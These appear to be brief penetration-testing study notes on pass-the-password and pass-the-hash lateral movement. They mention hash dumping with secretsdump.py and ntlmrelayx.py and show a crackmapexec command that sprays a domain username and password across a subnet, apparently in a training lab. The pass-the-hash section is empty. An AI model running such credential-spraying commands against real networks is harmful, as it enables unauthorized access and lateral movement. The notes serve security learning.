# **Pass the Password / Pass the Hash**

## **What are this?**

If we crack a password and/or can dump the SAM hashes with **secretsdump.py** or **ntlmrelayx.py**, we can leverage both for lateral movement in networks



## **Attack 1  : Crackmapexec**

```powershell
# show help message
$ crackmapexec --help

# Pass the password attack
$ sudo crackmapexec smb 192.168.0.0/24 -u fcastle -d MARVEL.local -p Password1

# Pass the hash attack
# 
```